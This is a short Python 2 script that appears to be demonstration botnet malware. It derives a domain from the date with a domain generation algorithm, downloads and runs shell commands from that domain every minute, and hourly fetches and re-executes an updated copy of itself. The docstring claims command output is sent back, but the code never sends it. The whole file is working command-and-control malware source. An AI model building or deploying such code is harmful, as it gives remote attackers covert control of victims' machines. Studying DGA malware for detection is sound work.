#!/usr/bin/python

import os
import sys
import time
import urllib
import sched
import subprocess
import datetime
from distutils.version import StrictVersion

# local variables
version = "1.0"
tld     = '.proteansec'
prevcmd = ""
uperiod = 60*60
cperiod = 60*1

s = sched.scheduler(time.time, time.sleep)


def update(domain):
  """
  Download and restart itself by replacing the program script file if not using
  the latest version. This is basically a self-modifying code, which updates itself
  if needed.
  """
  # download the latest version of the script
  ver = urllib.urlopen('http://' + domain + '/dga_version.txt').read()
  if StrictVersion(ver) > StrictVersion(version):
    urllib.urlretrieve('http://' + domain + '/main.py', 'main.py')
    print "The main.py was successfully updated."
  else:
    print "Updating not required - using the latest version."
    return

  # restart the program if it was updated
  os.execl(sys.executable, *([sys.executable]+sys.argv))


def generate_domain(year, month, day):
  """ Generates a domain by considering the current date. """
  global uperiod
  domain = ""
 
  # schedule the current function to be run periodically
  s.enter(uperiod, 1, command, (domain,))

  for i in range(16):
    year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
    month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
    day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
    domain += chr(((year ^ month ^ day) % 25) + 97)

  # add our own domain
  domain += tld

  return domain


def command(domain):
  """
  Download and execute a command every minute and store the last used command
  so the same command is not executed over and over again. The result of the ran
  command is sent to the webserver.
  """
  global prevcmd, cperiod

  # schedule the current function to be run periodically
  s.enter(cperiod, 1, command, (domain,))

  # download the latest command to be executed
  cmd = urllib.urlopen('http://' + domain + '/command.txt').read()
  if prevcmd == cmd:
    print "The command has already been run."
    return
  else:
    print "The command function was called successfully."

  # execute the current command and get output
  p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
  out = p.stdout.readlines()

  # remember the last command being run
  prevcmd = cmd
  


if __name__ == '__main__':
  # generate new domain
  now    = datetime.datetime.now()
  year   = now.year
  month  = now.month
  day    = now.day
  hour   = now.hour
  minute = now.minute
  second = now.second
  domain = generate_domain(year, month, day)
  print domain

  # update program every 60 minutes
  s.enter(uperiod, 1, update, (domain,))

  # execute command every minute
  s.enter(cperiod, 1, command, (domain,))

  # run the scheduler
  s.run()

